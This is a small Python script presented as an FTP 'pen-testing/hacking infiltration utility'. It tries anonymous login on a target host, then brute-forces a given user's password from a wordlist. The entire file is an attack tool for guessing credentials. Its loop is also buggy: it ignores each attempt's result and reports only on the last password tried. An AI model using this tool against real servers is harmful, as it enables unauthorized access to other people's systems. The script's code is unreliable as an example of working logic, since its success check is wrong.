#!/usr/bin/python3
# Created by c@caine
# On: 21/02/2017
# --- Preamble --- #
from ftplib import FTP
from sys import argv
# --- Declarations --- #
thost = argv[1]
uname = argv[2]
wlist = argv[3]
# --- Functions --- #
def conn (thost, user, password):
    try: 
      f = FTP(thost)
      f.login(user, password)
      f.quit()
      return (1)
    except:
      return (0)

def connAnon():
  print('[+] Trying anonymous credentials for ftp@%s' % thost)
  if conn(thost, 'anonymous', 'test@test.com'):
    print('[!] FTP anonymous login successful.\n')
    print('------------------------------------------------------- [Fphil v-0.01] --')
    exit(0)
  else:
    print('[-] FTP anonymous login failed.')

def connBrute():
  with open(wlist, 'r') as pwords:
    print ('[!] Attempting Brute-Force method, in..')

    from time import sleep 
    count = 3
    while (count >= 0):
      print('[%s] Press CTRL-C to Abort' % count)
      sleep(1)
      count += -1

    print ('[#] ...\n[#] Trying password list.. This may take a while')
    for l in pwords.readlines():
      pword = l.strip('\r' ).strip('\n')
      try:
        conn(thost, uname, pword)
      except:
        continue
    if conn(thost, uname, pword):
      print('[#] ...')
      print('-------------------------------------------------------------------------')
      print('[!] FTP login successful with:\n[>] USER: %s\n[>] PASS: %s\n[.]' % (uname, pword))
    else:
      print('[#]')
      print('-------------------------------------------------------------------------')
      print('[>] %s\'s password was not found in the list\n[.]' % uname)

def main ():
  print('-------------------------------------------------------------------------')
  print('### FTP Pen-Testing/Hacking Infiltration Utility ########################')
  print('--------------------------------------------------------- [Fphil-0.01] --')
  print('[*] TARGETING\t ->\tUSER: %s @ HOST: %s' % (uname, thost))
  print('-------------------------------------------------------------------------')
  connAnon()
  print('-------------------------------------------------------------------------')
  connBrute()
  print('--------------------------------------------------------- [Fphil-0.01] --')
# --- Main --- #
if __name__ == "__main__":
  main()
